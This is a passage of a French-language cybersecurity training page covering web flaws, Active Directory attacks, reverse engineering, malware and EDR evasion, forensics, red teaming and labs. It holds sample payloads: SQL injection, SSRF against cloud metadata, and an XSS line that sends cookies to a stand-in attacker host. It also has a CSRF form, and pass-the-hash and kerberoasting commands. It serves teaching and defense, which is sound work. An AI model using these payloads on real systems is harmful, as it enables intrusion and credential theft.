+<span class="cmt">-- time-based</span>
+'; IF (1=1) WAITFOR DELAY '0:0:5'--</pre>
+
+  <p><code>sqlmap -u "https://cible/?id=1" --batch --dbs</code> automatise. À utiliser après avoir compris à la main.</p>
+
+  <h4>A04 — Insecure Design</h4>
+  <p>Classe large : workflows mal pensés (reset de mdp par question secrète devinable, limites métier contournables, confiance côté client).</p>
+
+  <h4>A05 — Security Misconfiguration</h4>
+  <p>Headers absents, interfaces admin exposées, verbose errors, defaults non changés.</p>
+
+  <h4>A06 — Vulnerable Components</h4>
+  <p>Lib avec CVE connue (Log4Shell 2021). <code>npm audit</code>, <code>pip-audit</code>, <code>trivy</code>, <code>dependabot</code>.</p>
+
+  <h4>A07 — Auth failures</h4>
+  <ul>
+    <li>Pas de rate-limit → brute force</li>
+    <li>User enum via messages d'erreur distincts</li>
+    <li>Sessions prédictibles / sans expiration</li>
+    <li>Pas de 2FA sur comptes sensibles</li>
+  </ul>
+
+  <h4>A08 — Software &amp; data integrity failures</h4>
+  <p>Updates non signés, désérialisation non contrôlée, pipelines CI/CD empoisonnés.</p>
+
+  <h4>A09 — Logging &amp; monitoring failures</h4>
+  <p>Sans logs utiles, un incident reste invisible des mois. Médiane de détection post-breach : plus de 200 jours.</p>
+
+  <h4>A10 — SSRF</h4>
+  <p>L'app fait une requête vers une URL que tu contrôles — tu la fais pointer vers l'<b>intérieur</b>.</p>
+  <pre data-lang="http" class="label">POST /fetch HTTP/1.1
+url=http://169.254.169.254/latest/meta-data/     <span class="cmt"># metadata AWS</span>
+url=http://127.0.0.1:8500/v1/kv/?recurse         <span class="cmt"># Consul local</span>
+url=file:///etc/passwd                           <span class="cmt"># si schéma file autorisé</span></pre>
+
+  <h3>XSS — exécuter du JS chez autrui</h3>
+  <div class="grid3">
+    <div class="card">
+      <h4>Reflected</h4>
+      <p>Payload dans la requête, re-rendu dans la réponse. URL partagée.</p>
+    </div>
+    <div class="card">
+      <h4>Stored</h4>
+      <p>Payload persisté en DB (commentaire, profil). Touche tous les visiteurs.</p>
+    </div>
+    <div class="card">
+      <h4>DOM</h4>
+      <p>JS côté client manipule une source dangereuse (<code>location.hash</code>) vers un sink (<code>innerHTML</code>).</p>
+    </div>
+  </div>
+  <pre data-lang="html" class="label"><span class="cmt">&lt;!-- payloads de test --&gt;</span>
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+"&gt;&lt;script&gt;fetch('//attacker/'+document.cookie)&lt;/script&gt;</pre>
+  <p>Mitigation : échapper selon le contexte (HTML, attribut, JS, URL, CSS). <b>CSP</b> stricte en défense en profondeur.</p>
+
+  <h3>CSRF</h3>
+  <p>Faire exécuter une action au visiteur sur un site où il est authentifié, sans son consentement.</p>
+  <pre data-lang="html" class="label"><span class="cmt">&lt;!-- hébergé sur evil.com, victime connectée à bank.com --&gt;</span>
+&lt;form action="https://bank.com/transfer" method="POST" id="f"&gt;
+  &lt;input name="to" value="attacker"&gt;
+  &lt;input name="amount" value="1000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('f').submit()&lt;/script&gt;</pre>
+  <p>Mitigation : <b>SameSite=Lax/Strict</b> sur cookies, <b>CSRF tokens</b> par formulaire, <b>Origin/Referer</b> check côté serveur sur actions sensibles.</p>
+
+  <h3>Burp Suite — workflow</h3>
+  <ol>
+    <li>Proxy configuré sur le navigateur (<code>127.0.0.1:8080</code>) + CA de Burp importée</li>
+    <li>Browse le site → populate le Target → map le périmètre</li>
+    <li>Envoie une requête intéressante vers <b>Repeater</b> → joue avec</li>
+    <li><b>Intruder</b> pour fuzzer un paramètre</li>
+    <li><b>Decoder</b>, <b>Comparer</b>, extensions (<i>Autorize</i>, <i>JWT Editor</i>)</li>
+  </ol>
+
+  <div class="quiz" data-q="w1">
+    <div class="q">Meilleure défense contre les injections SQL :</div>
+    <label><input type="radio" name="w1"> Blacklister les mots-clés SQL dans l'input</label>
+    <label><input type="radio" name="w1"> WAF uniquement</label>
+    <label><input type="radio" name="w1" data-ok> Requêtes paramétrées (prepared statements)</label>
+    <div class="expl">La blacklist se contourne (encodage, commentaires). Le WAF aide mais n'est pas une mitigation primaire. Les prepared statements séparent code et données au niveau du driver — l'input ne peut plus devenir du SQL.</div>
+  </div>
+
+  <div class="quiz" data-q="w2">
+    <div class="q">Un cookie de session sans flag <code>HttpOnly</code> permet :</div>
+    <label><input type="radio" name="w2" data-ok> Son vol via XSS depuis <code>document.cookie</code></label>
+    <label><input type="radio" name="w2"> Son interception sur le réseau</label>
+    <label><input type="radio" name="w2"> Son usage sur un autre domaine</label>
+    <div class="expl"><code>HttpOnly</code> empêche l'accès JS au cookie. Sans ce flag, un XSS peut l'exfiltrer. L'interception réseau se mitige avec <code>Secure</code> + HTTPS. Le cross-domain se mitige avec <code>SameSite</code>.</div>
+  </div>
+</section>
+
+<section id="systemes">
+  <h2>06 — Systèmes &amp; Active Directory</h2>
+
+  <h3>Windows essentials</h3>
+  <table>
+    <tr><th>Concept</th><th>Détail</th></tr>
+    <tr><td>SID</td><td>Identifiant unique d'un principal (user, group, machine)</td></tr>
+    <tr><td>Token</td><td>Objet attaché à un process, porte SID + privilèges + ACL</td></tr>
+    <tr><td>NTLM</td><td>Hash du mdp, authentification legacy, encore partout</td></tr>
+    <tr><td>Kerberos</td><td>Auth AD moderne, tickets TGT/TGS</td></tr>
+    <tr><td>SAM</td><td>Base locale de comptes (<code>%SystemRoot%\System32\config\SAM</code>)</td></tr>
+    <tr><td>LSASS</td><td>Process qui garde les secrets en mémoire — cible de Mimikatz</td></tr>
+    <tr><td>SMB</td><td>Partages, pipes, auth transport</td></tr>
+  </table>
+
+  <h3>Active Directory en 10 lignes</h3>
+  <ul>
+    <li>Forêt → domaine(s) → OU → objets (users, computers, groups, GPO)</li>
+    <li>Chaque machine jointe = compte machine (<code>HOSTNAME$</code>)</li>
+    <li>Auth par Kerberos : KDC (DC) distribue TGT puis TGS pour chaque service</li>
+    <li>Les SPN lient un service à un compte — pépite pour kerberoasting</li>
+    <li>Groupes clé : Domain Admins, Enterprise Admins, Account Operators</li>
+    <li>GPO = politiques appliquées aux objets</li>
+  </ul>
+
+  <h3>Attaques AD classiques</h3>
+  <div class="card">
+    <h4>LLMNR / NBT-NS poisoning</h4>
+    <p>Quand un host demande "qui est <code>fileserv</code> ?" en multicast, tu réponds. L'host t'envoie son hash NetNTLMv2 → craquage offline.</p>
+    <p>Outil : <code>Responder -I eth0</code>.</p>
+    <p>Mitigation : désactiver LLMNR et NBT-NS via GPO, forcer SMB signing.</p>
+  </div>
+
+  <div class="card">
+    <h4>Kerberoasting</h4>
+    <p>Tout utilisateur authentifié peut demander un TGS pour n'importe quel SPN. Le ticket est chiffré avec le hash du compte de service → craquage offline si mdp faible.</p>
+    <pre data-lang="bash" class="label"><span class="cmt"># depuis Linux avec impacket</span>
+GetUserSPNs.py -request -dc-ip 10.0.0.1 corp.local/user:pass
+hashcat -m 13100 tickets.hash rockyou.txt</pre>
+    <p>Mitigation : mots de passe longs sur comptes de service, MSAs/gMSAs.</p>
+  </div>
+
+  <div class="card">
+    <h4>AS-REP Roasting</h4>
+    <p>Comptes avec "Do not require Kerberos preauth" → tu demandes un AS-REP sans fournir de crédentiel, le ticket contient de la data chiffrée avec le hash user. Offline crack.</p>
+    <pre data-lang="bash" class="label">GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1</pre>
+  </div>
+
+  <div class="card">
+    <h4>Pass-the-Hash</h4>
+    <p>NTLM auth n'exige pas le mdp clair — le hash suffit. Vole le hash via LSASS/SAM, authentifie à distance.</p>
+    <pre data-lang="bash" class="label">crackmapexec smb 10.0.0.0/24 -u admin -H &lt;ntlmhash&gt;
+impacket-psexec -hashes :&lt;ntlmhash&gt; admin@10.0.0.5</pre>
+  </div>
+
+  <div class="card">
+    <h4>Pass-the-Ticket / Golden Ticket / Silver Ticket</h4>
+    <p><b>Golden</b> = TGT forgé avec le hash du compte <code>krbtgt</code> (nécessite compromission domaine). Persistance quasi-éternelle jusqu'au double rotate du krbtgt.</p>
+    <p><b>Silver</b> = TGS forgé pour un service unique (nécessite hash du compte de service).</p>
+  </div>
+
+  <h3>Privilege escalation local — Linux</h3>
+  <ul>
+    <li>Noyau — <code>uname -a</code> → <code>searchsploit</code></li>
+    <li>Sudo mal configuré — <code>sudo -l</code>, cf. GTFOBins</li>
+    <li>SUID — <code>find / -perm -4000</code></li>
+    <li>Capabilities — <code>getcap -r / 2&gt;/dev/null</code></li>
+    <li>Cron jobs écrivables, PATH relatif</li>
+    <li>Services écoutant en localhost</li>
+    <li>Automatiser : <code>linpeas.sh</code>, <code>linux-smart-enumeration</code></li>
+  </ul>
+
+  <h3>Privilege escalation local — Windows</h3>
+  <ul>
+    <li>Services avec chemin non quoté + ACL faible</li>
+    <li>AlwaysInstallElevated → MSI SYSTEM</li>
+    <li>Jetons privilégiés (SeImpersonate → PrintSpoofer/JuicyPotato)</li>
+    <li>UAC bypass, DLL hijacking</li>
+    <li>Automatiser : <code>winPEAS.exe</code>, <code>PowerUp.ps1</code>, <code>Seatbelt.exe</code></li>
+  </ul>
+
+  <div class="quiz" data-q="s1">
+    <div class="q">Tu craques un hash NetNTLMv2 obtenu via Responder. Hashcat mode ?</div>
+    <label><input type="radio" name="s1"> 1000</label>
+    <label><input type="radio" name="s1" data-ok> 5600</label>
+    <label><input type="radio" name="s1"> 13100</label>
+    <div class="expl">1000 = NTLM brut. 5600 = NetNTLMv2 (Responder). 13100 = Kerberos TGS (kerberoast).</div>
+  </div>
+</section>
+
+<section id="reverse">
+  <h2>07 — Reverse engineering</h2>
+  <p>Comprendre un binaire sans son code source. Base de l'analyse malware, de la recherche de vulns, du cracking de protections.</p>
+
+  <h3>Prérequis mentaux</h3>
+  <ul>
+    <li>Assembleur x86-64 (registres, pile, calling conventions)</li>
+    <li>Formats de binaires : <b>PE</b> (Windows), <b>ELF</b> (Linux), <b>Mach-O</b> (macOS)</li>
+    <li>Compilation : source → asm → objet → linked binary</li>
+    <li>Dynamique vs statique</li>
+  </ul>
+
+  <h3>x86-64 — minimum vital</h3>
+  <table>
+    <tr><th>Registre</th><th>Rôle (Linux System V)</th></tr>
+    <tr><td>RAX</td><td>Valeur de retour</td></tr>
+    <tr><td>RDI, RSI, RDX, RCX, R8, R9</td><td>6 premiers arguments</td></tr>
+    <tr><td>RSP</td><td>Stack pointer</td></tr>
+    <tr><td>RBP</td><td>Base pointer (optionnel)</td></tr>
+    <tr><td>RIP</td><td>Instruction pointer</td></tr>
+  </table>
+  <p>Windows x64 : args dans RCX, RDX, R8, R9 + shadow space 32 octets.</p>
+
+  <h3>Outils</h3>
+  <div class="grid3">
+    <div class="card">
+      <h4>Statique</h4>
+      <ul>
+        <li><b>Ghidra</b> — NSA, gratuit, décompile en pseudo-C</li>
+        <li><b>IDA Free/Pro</b> — standard industrie</li>
+        <li><b>Binary Ninja</b></li>
+        <li><b>radare2 / rizin / cutter</b></li>
+      </ul>
+    </div>
+    <div class="card">
+      <h4>Dynamique</h4>
+      <ul>
+        <li><b>x64dbg</b> — Windows user-mode</li>
+        <li><b>WinDbg</b> — Windows kernel + user</li>
+        <li><b>gdb + gef / pwndbg</b> — Linux</li>
+        <li><b>Frida</b> — hooking JS cross-plateforme</li>
+      </ul>
+    </div>
+    <div class="card">
+      <h4>Triage</h4>
+      <ul>
+        <li><b>file, strings, binwalk</b></li>
+        <li><b>objdump -d</b>, <b>readelf</b>, <b>nm</b></li>
+        <li><b>Detect It Easy (DiE)</b></li>
+        <li><b>PE-bear</b>, <b>CFF Explorer</b></li>
+      </ul>
+    </div>
+  </div>
+
+  <h3>Workflow type sur un binaire inconnu</h3>
+  <ol>
+    <li><code>file bin</code> → architecture, type</li>
+    <li><code>strings -n 8 bin | less</code> → URLs, chemins, erreurs, debug</li>
+    <li><code>readelf -a bin</code> / PE-bear → sections, imports, entropy (chiffré ?)</li>
+    <li>Charger dans Ghidra → identifier <code>main</code> / <code>WinMain</code> → remonter depuis les strings</li>
+    <li>Renommer les fonctions / variables à mesure que tu comprends</li>
+    <li>Si packed, dumper après unpacking en mémoire (x64dbg + Scylla)</li>
+  </ol>
+
+  <h3>Exemple — fonction à inverser</h3>
+  <pre data-lang="c" class="label"><span class="cmt">// code source d'origine (qu'on ne voit pas)</span>
+int check(char *s) {
+    char key[] = "r3v3rs3";
+    for (int i = 0; i &lt; 7; i++) {
+        if (s[i] != (key[i] ^ 0x5A)) return 0;
+    }
+    return 1;
+}</pre>
+  <pre data-lang="asm" class="label"><span class="cmt">; vue désassemblée (simplifiée)</span>
+check:
+    xor     ecx, ecx                 <span class="cmt">; i = 0</span>
+.loop:
+    mov     al, [rdi+rcx]            <span class="cmt">; s[i]</span>
+    mov     dl, [rip+key+rcx]        <span class="cmt">; key[i]</span>
+    xor     dl, 0x5A
+    cmp     al, dl
+    jne     .fail
+    inc     rcx
+    cmp     rcx, 7
+    jl      .loop
+    mov     eax, 1
+    ret
+.fail:
+    xor     eax, eax
+    ret</pre>
+  <p>On lit la constante <code>0x5A</code>, les 7 octets de <code>key</code>, on XOR → on retrouve le mot de passe. C'est l'archétype de "trouve le flag".</p>
+
+  <h3>Anti-RE qu'on rencontre</h3>
+  <ul>
+    <li><b>Packing</b> — UPX (trivial), VMProtect, Themida (dur)</li>
+    <li><b>Anti-debug</b> — <code>IsDebuggerPresent</code>, PEB check, int 3, timing</li>
+    <li><b>Anti-VM</b> — artefacts VBoxGuest, MAC vendor, nb de CPU</li>
+    <li><b>Chiffrement de strings</b> — déchiffrées en mémoire au besoin</li>
+    <li><b>Control-flow flattening, opaque predicates</b></li>
+  </ul>
+</section>
+
+<section id="malware">
+  <h2>08 — Malware &amp; EDR</h2>
+
+  <h3>Taxonomie</h3>
+  <table>
+    <tr><th>Famille</th><th>Rôle</th></tr>
+    <tr><td>Dropper / Loader</td><td>Charger un payload (en mémoire idéalement)</td></tr>
+    <tr><td>Stealer</td><td>Vol de credentials, cookies, wallets</td></tr>
+    <tr><td>RAT</td><td>Contrôle à distance interactif</td></tr>
+    <tr><td>Backdoor</td><td>Accès persistant discret</td></tr>
+    <tr><td>Rootkit</td><td>Cache process/files/connexions au niveau noyau</td></tr>
+    <tr><td>Ransomware</td><td>Chiffre, extorque</td></tr>
+    <tr><td>Worm</td><td>Se propage de lui-même</td></tr>
+    <tr><td>Botnet</td><td>Flotte contrôlée par C2</td></tr>
+  </table>
+
+  <h3>Chaîne d'exécution typique</h3>
+  <ol>
+    <li>Vecteur initial — phishing (macro Office, LNK, HTML smuggling, ISO), exploit, chaîne d'appro</li>
+    <li>Loader minimal → télécharge ou décode le stage principal</li>
+    <li>Évasion — anti-sandbox, anti-EDR</li>
+    <li>Persistance — registre, tâche planifiée, service, startup</li>
+    <li>C2 — HTTPS vers domaine fronting / CDN, DNS, SMB nommé</li>
+    <li>Lateral movement — WMI, SMB, PsExec, RDP</li>
+    <li>Objectif — exfil, chiffrement, destruction</li>
+  </ol>
+
+  <h3>EDR — ce qu'il voit</h3>
+  <p>Un EDR moderne (CrowdStrike, Defender for Endpoint, SentinelOne, Elastic) hook en user-mode (ntdll inline hooks, ETW) et parfois en kernel (callbacks, mini-filter). Il regarde :</p>
+  <ul>
+    <li>Création de process, parent anormal (ex. <code>winword.exe</code> → <code>powershell.exe</code>)</li>
+    <li>Chargement de DLL, side-loading</li>
+    <li>Appels sensibles : <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>CreateRemoteThread</code> → injection</li>
+    <li>Accès à LSASS</li>
+    <li>Traffic réseau anormal</li>
+    <li>ETW events (Threat Intelligence, kernel-process)</li>
+  </ul>
+
+  <h3>Techniques d'évasion (connaître pour détecter)</h3>
+  <ul>
+    <li><b>Unhooking ntdll</b> — recharger la version propre depuis disque</li>
+    <li><b>Direct / indirect syscalls</b> — contourner les hooks user-mode (HellsGate, SysWhispers)</li>
+    <li><b>ETW patching</b> — <code>EtwEventWrite</code> ← <code>ret</code></li>
+    <li><b>AMSI bypass</b> — patch <code>AmsiScanBuffer</code> en mémoire</li>
+    <li><b>Sleep obfuscation</b> — Ekko, Foliage : chiffrer le .text pendant les sleeps</li>
+    <li><b>Process hollowing / Early Bird / Module Stomping</b></li>
+    <li><b>LOLBAS / LOLBins</b> — abuser des binaires signés légitimes (<code>rundll32</code>, <code>mshta</code>, <code>certutil</code>, <code>wmic</code>)</li>
+  </ul>
+
+  <h3>Analyse — labo d'un échantillon suspect</h3>
+  <div class="danger-box">
+    <strong>Isole, toujours.</strong> VM snapshot, pas de carte réseau partagée, pas d'accès aux dossiers hôte. Mieux : Flare-VM / REMnux, segment réseau avec <code>INetSim</code> pour simuler les services.
+  </div>
+  <ol>
+    <li><b>Statique rapide</b> — hash, VirusTotal (ou pas si opsec), strings, PE sections, imports, entropy</li>
+    <li><b>Dynamique</b> — <code>Procmon</code> (fichiers, registre), <code>Procexp</code>, <code>Wireshark</code>, <code>Fakenet-NG</code></li>
+    <li><b>Mémoire</b> — snapshot RAM, <code>volatility</code> → process cachés, injections</li>
+    <li><b>Comportement</b> — persistance ? C2 ? objectifs ?</li>
+    <li><b>IOC</b> — hashs, domaines, mutex, chemins, règles Yara</li>
+  </ol>
+
+  <h3>Yara — exemple</h3>
+  <pre data-lang="yara" class="label">rule Suspect_Loader_PowerShell {
+    meta:
+        author = "cyberlab"
+        desc   = "PS loader with base64 + IEX"
+    strings:
+        $a = "FromBase64String" nocase
+        $b = "IEX" nocase
+        $c = "Invoke-Expression" nocase
+        $d = /DownloadString\s*\(/ nocase
+    condition:
+        $a and ($b or $c) and $d
+}</pre>
+</section>
+
+<section id="forensics">
+  <h2>09 — Forensics / DFIR</h2>
+  <p>Quand quelque chose s'est passé, et qu'on veut savoir quoi, comment, qui, et comment éviter que ça recommence.</p>
+
+  <h3>Principes</h3>
+  <ol>
+    <li><b>Ordre de volatilité</b> — RAM &gt; état réseau &gt; process &gt; disque &gt; stockage distant &gt; backups</li>
+    <li><b>Chaîne de preuve</b> — qui a touché quoi, quand, hash avant/après</li>
+    <li><b>Travailler sur une copie</b> — bit-à-bit (<code>dd</code>, <code>FTK Imager</code>), write-blocker si physique</li>
+    <li><b>Documenter en continu</b> — journal horodaté, screenshots, hashs</li>
+  </ol>
+
+  <h3>Acquisition</h3>
+  <pre data-lang="bash" class="label"><span class="cmt"># image disque bit-à-bit, hash contrôlé</span>
+sudo dd if=/dev/sdb of=/mnt/evidence/disk.img bs=4M status=progress
+sha256sum /mnt/evidence/disk.img &gt; disk.img.sha256
+
+<span class="cmt"># image mémoire Linux — LiME</span>
+sudo insmod lime.ko "path=/mnt/ev/mem.lime format=lime"
+
+<span class="cmt"># mémoire Windows — WinPMem / DumpIt / Belkasoft RAM Capturer</span>
+winpmem.exe -o mem.raw</pre>
+
+  <h3>Analyse mémoire — Volatility 3</h3>
+  <pre data-lang="bash" class="label">vol -f mem.raw windows.info
+vol -f mem.raw windows.pslist
+vol -f mem.raw windows.pstree
+vol -f mem.raw windows.cmdline
+vol -f mem.raw windows.netscan
+vol -f mem.raw windows.malfind         <span class="cmt"># détecte injections</span>
+vol -f mem.raw windows.dumpfiles --pid 4820</pre>
+
+  <h3>Artefacts Windows à connaître</h3>
+  <table>
+    <tr><th>Artefact</th><th>Localisation</th><th>Que ça dit</th></tr>
+    <tr><td>MFT</td><td><code>$MFT</code> à la racine NTFS</td><td>Historique création/modif de fichiers</td></tr>
+    <tr><td>USN Journal</td><td><code>$Extend\$UsnJrnl</code></td><td>Changements FS récents</td></tr>
+    <tr><td>Prefetch</td><td><code>C:\Windows\Prefetch</code></td><td>Exécutables lancés</td></tr>
+    <tr><td>Shimcache / AppCompat</td><td>Registre</td><td>Programmes vus (même non lancés)</td></tr>
+    <tr><td>Amcache</td><td><code>Amcache.hve</code></td><td>Métadonnées exécutables (hash SHA-1)</td></tr>
+    <tr><td>UserAssist</td><td>HKCU</td><td>Programmes lancés par GUI</td></tr>
+    <tr><td>RecentDocs, Jumplists</td><td>HKCU, AppData</td><td>Fichiers récents</td></tr>
+    <tr><td>Event Logs</td><td><code>C:\Windows\System32\winevt\Logs</code></td><td>Auth, PowerShell, Sysmon</td></tr>
+    <tr><td>Registry hives</td><td><code>SYSTEM, SOFTWARE, SAM, NTUSER.DAT</code></td><td>Config, persistance</td></tr>
+  </table>
+
+  <h3>Logs à corréler en priorité</h3>
+  <ul>
+    <li>Security — 4624 (login), 4625 (fail), 4672 (special), 4688 (process)</li>
+    <li>PowerShell/Operational — 4104 (scriptblock)</li>
+    <li>Sysmon — 1 (process), 3 (netconn), 7 (image load), 11 (file create), 13 (regset)</li>
+  </ul>
+
+  <h3>Linux side</h3>
+  <ul>
+    <li><code>/var/log/auth.log</code> — SSH, sudo</li>
+    <li><code>/var/log/syslog</code>, <code>journalctl</code></li>
+    <li><code>.bash_history</code>, <code>last</code>, <code>lastlog</code>, <code>wtmp</code></li>
+    <li><code>/etc/crontab</code>, <code>/etc/systemd/system/*</code> — persistance</li>
+    <li>Timeline avec <code>plaso/log2timeline</code> → <code>psort</code></li>
+  </ul>
+</section>
+
+<section id="redteam">
+  <h2>10 — Red team / pentest</h2>
+
+  <h3>Méthodologie — PTES / OSSTMM / MITRE</h3>
+  <ol>
+    <li><b>Pré-engagement</b> — scope, rules of engagement, autorisation écrite, points de contact</li>
+    <li><b>Reconnaissance</b> — OSINT (whois, DNS, LinkedIn, GitHub, pastebin, Shodan)</li>
+    <li><b>Scanning / énumération</b> — nmap, services, versions, CMS, buckets S3</li>
+    <li><b>Exploitation</b> — vuln web, service, phishing, social engineering</li>
+    <li><b>Post-exploitation</b> — privesc, persistance, lateral, loot</li>
+    <li><b>Reporting</b> — exec summary, détail technique, scoring (CVSS), remédiation</li>
+    <li><b>Clean-up</b> — retirer implants, comptes, règles</li>
+  </ol>
+
+  <h3>Reconnaissance externe — outils</h3>
+  <pre data-lang="bash" class="label"><span class="cmt"># sous-domaines</span>
+amass enum -d target.com
+subfinder -d target.com -all
+assetfinder target.com
+
+<span class="cmt"># resolve et probe HTTP</span>
+cat subs.txt | dnsx -silent | httpx -silent -status-code -title -tech-detect
+
+<span class="cmt"># ports exposés sur le périmètre</span>
+naabu -list resolved.txt -top-ports 1000
+
+<span class="cmt"># recherche buckets, repos leak</span>
+gitleaks detect -s . 
+trufflehog github --org target
+<span class="cmt"># Google dorks : site:target.com ext:pdf, filetype:env password</span></pre>
+
+  <h3>Phishing — infra minimale (dans un cadre autorisé)</h3>
+  <ul>
+    <li>Domaine ressemblant, âgé, warm-up SMTP</li>
+    <li>DKIM/SPF/DMARC propres</li>
+    <li>GoPhish ou Evilginx2 (reverse-proxy, cookies + MFA)</li>
+    <li>Pretext aligné sur la cible (recrutement, facture, DRH)</li>
+    <li>Payload : LNK → PowerShell, ISO → LNK → JScript, HTML smuggling, OneNote</li>
+    <li>C2 : Mythic, Sliver, Cobalt Strike (commercial), Havoc</li>
+  </ul>
+
+  <h3>C2 — en quoi ça consiste</h3>
+  <p>Un implant sur la cible rappelle périodiquement un serveur contrôlé par l'opérateur. Il reçoit des tâches, les exécute, renvoie des résultats. Les propriétés qu'on cherche :</p>
+  <ul>
+    <li><b>Transport discret</b> — HTTPS vers CDN, DNS over HTTPS, SMB nommé pour lateral</li>
+    <li><b>Jitter + sleep long</b> — ne pas battre comme un métronome</li>
+    <li><b>Profils malléables</b> — mimer un trafic légitime (ex. télémétrie Office)</li>
+    <li><b>Redirecteurs</b> — plusieurs couches avant le vrai teamserver</li>
+    <li><b>Payload modulaire</b> — chargé à la demande</li>
+  </ul>
+
+  <h3>Mouvement latéral</h3>
+  <table>
+    <tr><th>Technique</th><th>Protocole</th><th>Signatures</th></tr>
+    <tr><td>PsExec / impacket-psexec</td><td>SMB + service</td><td>4697 service created, bruyant</td></tr>
+    <tr><td>WMI exec</td><td>DCOM/RPC</td><td>Création WmiPrvSE child</td></tr>
+    <tr><td>WinRM / Evil-WinRM</td><td>5985/5986</td><td>Events WinRM</td></tr>
+    <tr><td>DCOM (MMC20)</td><td>DCOM</td><td>Moins loggé que WMI</td></tr>
+    <tr><td>RDP (hashes)</td><td>3389</td><td>Login type 10</td></tr>
+    <tr><td>SMB admin$ copy + sched task</td><td>SMB</td><td>Task events</td></tr>
+  </table>
+
+  <h3>Reporting — ce qui compte</h3>
+  <ul>
+    <li>Exec summary 1 page — risque business, pas technique</li>
+    <li>Chemin d'attaque illustré (du vecteur initial au trophée)</li>
+    <li>Chaque findings : description, preuve, impact, remédiation concrète, référence (CWE, CVE)</li>
+    <li>Scoring CVSS 3.1 + contexte business</li>
+    <li>Appendices : IPs, timestamps, hashs — pour que le SOC puisse valider ses détections</li>
+  </ul>
+</section>
+
+<section id="opsec">
+  <h2>11 — OPSEC</h2>
+  <p>Operational Security : ne pas se faire voir, ne pas se faire identifier, ne pas contaminer. Vaut autant pour le red teamer que pour le chercheur sous NDA.</p>
+
+  <h3>Compartimentage</h3>
+  <ul>
+    <li>Une VM par persona / mission. Jamais mélanger.</li>
+    <li>Mail et identité dédiés par persona. Pas de réutilisation.</li>
+    <li>Snapshots avant chaque opération, rollback après.</li>
+    <li>Rien de personnel (clipboard, historique nav) sur la VM op.</li>
+  </ul>
+
+  <h3>Chaîne réseau</h3>
+  <ul>
+    <li>VPN de confiance → sortie Tor si anonymat réel requis</li>
+    <li>Pas de même VPN entre persona op et perso</li>
+    <li>DNS filtré, pas de leak IPv6 (<code>whoer.net</code>, <code>ipleak.net</code> pour vérifier)</li>
+    <li>User-agent, timezone, langue cohérents avec la persona</li>
+  </ul>
+
+  <h3>Logs et métadonnées</h3>
+  <ul>
+    <li>Vider métadonnées des fichiers (<code>exiftool</code>, <code>mat2</code>)</li>
+    <li>Scrubber les commentaires de code, chemins d'auteur</li>
+    <li>Pas de nom de domaine qui "signe" l'auteur (habitudes de nommage)</li>
+    <li>Vérifier les headers mail (X-Mailer, Message-ID) avant envoi</li>
+  </ul>
+
+  <h3>Côté personnel</h3>
+  <ul>
+    <li>Gestionnaire de mdp (Bitwarden, KeePassXC) + mdp uniques</li>
+    <li>MFA matériel (YubiKey) sur les comptes critiques</li>
+    <li>Chiffrement disque (LUKS, BitLocker, FileVault)</li>
+    <li>Backup 3-2-1 chiffré, testé</li>
+    <li>Signal pour comms sensibles, pas WhatsApp pour tout confondre</li>
+  </ul>
+</section>
+
+<section id="labs">
+  <h2>12 — Labs &amp; CTF</h2>
+  <p>La cyber ne s'apprend pas en lecture seule. Les plateformes ci-dessous donnent des cibles légales à casser, de débutant à expert.</p>
+
+  <div class="grid2">
+    <div class="card">
+      <h4>Démarrer</h4>
+      <ul>
+        <li><a href="https://tryhackme.com" target="_blank">TryHackMe</a> — parcours guidés, excellent pour débutants</li>
+        <li><a href="https://overthewire.org/wargames/" target="_blank">OverTheWire</a> — bandit, natas, narnia (shell + web + binaire)</li>
+        <li><a href="https://picoctf.org" target="_blank">PicoCTF</a> — CTF jeunes, qualité élevée</li>
+        <li><a href="https://portswigger.net/web-security" target="_blank">PortSwigger Web Security Academy</a> — <b>référence</b> pour le web, gratuit, labs intégrés</li>
+      </ul>
+    </div>
+    <div class="card">
+      <h4>Monter en gamme</h4>
+      <ul>
+        <li><a href="https://www.hackthebox.com" target="_blank">HackTheBox</a> — machines, Pro Labs (AD complets), Starting Point</li>
+        <li><a href="https://www.vulnhub.com" target="_blank">VulnHub</a> — VMs à télécharger pour labo offline</li>
+        <li><a href="https://pwn.college" target="_blank">pwn.college</a> — binary exploitation universitaire</li>
+        <li><a href="https://academy.hackthebox.com" target="_blank">HTB Academy</a> — parcours payants structurés</li>
+      </ul>
+    </div>
+    <div class="card">
+      <h4>Spécifique red team / AD</h4>
+      <ul>
+        <li>HTB Pro Labs : Dante, Offshore, Cybernetics, RastaLabs</li>
+        <li><a href="https://www.semperis.com" target="_blank">GOAD</a> — Game Of Active Directory, labo AD vulnérable auto-déployé</li>
+        <li>Zero Point Security — Red Team Ops (CRTO)</li>
+      </ul>
+    </div>
+    <div class="card">
+      <h4>Blue / DFIR</h4>
+      <ul>
+        <li><a href="https://blueteamlabs.online" target="_blank">BTLO</a> — Blue Team Labs Online</li>
+        <li><a href="https://cyberdefenders.org" target="_blank">CyberDefenders</a> — challenges forensics / threat hunting</li>
+        <li><a href="https://letsdefend.io" target="_blank">LetsDefend</a> — simulateur SOC</li>
+        <li>DFIR.Science, 13Cubed sur YouTube</li>
+      </ul>
+    </div>
+  </div>
+
+  <h3>Progression suggérée</h3>
+  <ol>
+    <li>TryHackMe Pre-Security + Introduction to Cyber Security (2–4 semaines)</li>
+    <li>OverTheWire Bandit → Natas (1–2 semaines)</li>
+    <li>PortSwigger Academy — toutes les leçons apprenti (3–4 semaines)</li>
+    <li>HTB Starting Point tier 1 + 2</li>
+    <li>Machines HTB "Easy" en autonomie — écrire un writeup par box</li>
+    <li>Monter vers Medium, puis Hard. Spécialiser (web, AD, reverse) selon affinité.</li>
+  </ol>
+
+  <h3>Certifications utiles (si tu veux le papier)</h3>
+  <table>
+    <tr><th>Certif</th><th>Angle</th><th>Niveau</th></tr>
+    <tr><td>CompTIA Security+</td><td>Généraliste, QCM</td><td>Entrée</td></tr>
+    <tr><td>eJPT (INE)</td><td>Pentest pratique</td><td>Entrée+</td></tr>
+    <tr><td>PNPT (TCM)</td><td>Pentest full chain + AD</td><td>Intermédiaire, abordable</td></tr>
+    <tr><td>OSCP (Offsec)</td><td>Pentest lab + exam 24h</td><td>Intermédiaire, référence RH</td></tr>
+    <tr><td>CRTO / CRTP</td><td>Red team / AD</td><td>Intermédiaire+</td></tr>
